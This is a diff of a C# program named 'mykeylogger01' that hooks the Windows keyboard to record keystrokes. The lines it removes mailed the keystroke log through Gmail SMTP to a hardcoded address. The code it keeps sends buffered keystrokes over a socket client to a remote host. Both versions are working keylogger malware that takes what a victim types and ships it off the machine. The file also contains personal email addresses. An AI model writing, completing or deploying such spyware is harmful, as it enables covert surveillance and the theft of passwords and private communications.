@@ -2,26 +2,13 @@
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Windows.Forms;
-using System.IO;
-using System.Net.Mail;
-using System.Net;
 using Networking;
 
 namespace mykeylogger01
 {
     class Program
     {
-        // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
-        private const string FROM_EMAIL_ADDRESS = "dfuzzwubfratdedbwx@tcwlm.com";
-        private const string FROM_EMAIL_PASSWORD = "";
-        private const string TO_EMAIL_ADDRESS = "smithcl6@vcu.edu";
-        private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
-        private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
-        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
-        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
-        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 10;
-        // ----------------------------- END -------------------------------- //
-
+        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 100;
         private static int WH_KEYBOARD_LL = 13;
         private static int WM_KEYDOWN = 0x0100;
         private static IntPtr hook = IntPtr.Zero;
@@ -42,44 +29,14 @@ namespace mykeylogger01
 
             if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
             {
+                try {
                 Client client = new Client();
                 client.clientSocket(buffer);
-
-                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
-                output.Write(buffer);
-                output.Close();
-                buffer = "";
-            }
-
-            FileInfo logFile = new FileInfo(@"C:\ProgramData\mylog.txt");
-
-            // Archive and email the log file if the max size has been reached
-            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
-            {
-                try
-                {
-                    // Copy the log file to the archive
-                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);
-
-                    // Delete the log file
-                    logFile.Delete();
-
-                    // Email the archive and send email using a new thread
-                    System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
-                    Console.Out.WriteLine("\n\n**MAILSENDING**\n");
-                    mailThread.Start();
-                }
-                catch(Exception e)
-                {
-                    Console.Out.WriteLine(e.Message);
-                }
-
-                try {
-
                 }
                 catch(Exception e) {
-                    Console.Out.WriteLine(e.Message);
+                    Console.WriteLine(e);
                 }
+                buffer = "";
             }
 
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
@@ -108,55 +65,6 @@ namespace mykeylogger01
             }
             
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
-        }
-
-        public static void sendMail()
-        {
-            try
-            {
-                // Read the archive file contents into the email body variable
-                StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
-                string emailBody = input.ReadToEnd();
-                input.Close();
-
-                // Create the email client object
-                SmtpClient client = new SmtpClient("smtp.gmail.com")
-                {
-                    Port = 587,
-                    DeliveryMethod = SmtpDeliveryMethod.Network,
-                    UseDefaultCredentials = false,
-                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD),
-                    EnableSsl = true,
-                };
-
-                // Build the email message
-                MailMessage message = new MailMessage
-                {
-                    From = new MailAddress(FROM_EMAIL_ADDRESS),
-                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
-                    Body = emailBody,
-                    IsBodyHtml = false,
-                };
-
-                if (INCLUDE_LOG_AS_ATTACHMENT)
-                {
-                    Attachment attachment = new Attachment(@"C:\ProgramData\mylog_archive.txt", System.Net.Mime.MediaTypeNames.Text.Plain);
-                    message.Attachments.Add(attachment);
-                }
-
-                // Set the recipient
-                message.To.Add(TO_EMAIL_ADDRESS);
-
-                // Send the message
-                client.Send(message);
-
-                // Release resources used by the msssage (archive file)
-                message.Dispose();
-            }
-            catch (Exception e)
-            {
-                Console.Out.WriteLine(e.Message);
-            }
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
